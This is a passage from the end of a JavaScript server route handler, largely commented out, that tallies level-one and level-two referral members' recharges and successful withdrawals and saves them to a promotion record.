    //     });
    //     const getAllWithdrawal = await withdrawal.find({userId: level1Member.id});
    //     for(const allWith of getAllWithdrawal){
    //      if(allWith.status === 'Success'){
    //         totalWith += allWith.amount;
    //      }
    //     }
    //     const level1Phone = level1.mobile;
    //     level1Data.set(level1Phone, {firstRecharge,totalRecharge,totalWithdrawal: totalWith});
    //   }
    //    }
    //    //level2
    //    for (const level2 of element.level2){
    //     const level2Member = await User.findOne({phone: level2.mobile});
    //     if(level2Member){
    //     var totalRecharge = 0;
    //     var totalWith = 0;
    //     var firstRecharge = 0;
    //     if(level2Member.rechargeHistory.isNotEmpty){
    //       firstRecharge = rechargeHistory[0].amount;
    //      }
    //     level2Member.rechargeHistory.forEach(recharge => {
    //      totalRecharge += parseInt(recharge.amount);
    //     });
    //     const getAllWithdrawal = await withdrawal.find({userId: level2Member.id});
    //     for(const allWith of getAllWithdrawal){
    //      if(allWith.status === 'Success'){
    //         totalWith += allWith.amount;
    //      }
    //     }
    //     const level2Phone = level2.mobile;
    //     level2Data.set(level2Phone, {firstRecharge,totalRecharge,totalWithdrawal: totalWith});
    //   }
    //    }
    //  await promotion.updateOne({userId: element.id},{userId: element.id,level0: level0Data,level1: level1Data,level2: level2Data},{upsert: true})
    // }
  }

  res.status(200).send("done");
};
